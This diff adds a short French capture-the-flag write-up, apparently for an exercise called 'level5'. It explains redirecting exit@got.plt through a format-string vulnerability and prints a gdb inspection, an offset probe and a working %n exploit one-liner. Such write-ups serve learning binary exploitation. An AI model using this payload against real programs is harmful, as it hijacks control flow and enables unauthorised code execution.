@@ -1,0 +1,18 @@
+Cet exercice reprend exactement le principe du précédent, mais l'on effectue une redirection du exit@got.
+GOT fonctionne un peu comme la libc ou les adrresses des fonctions sont stockes en dur.
+
+Pour faire la redirection du exit, on doit d'abord le trouver, pour cela on va suivre l'exit de la fonction n et a la fin on obtient:
+
+```(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:       0x080483d6
+```
+
+On doit maintenant écrire `134513828` dans `0x08049838`.
+
+Pour trouver l'offset on fait un ```AAAA%p%p%p%p%...```
+et on voit que l'ecriture se fait a la position 4.
+
+Voici le nouveau code :
+```bash
+(echo $'\x38\x98\x04\x08%134513824d%4$n';cat) | ./level5
+```
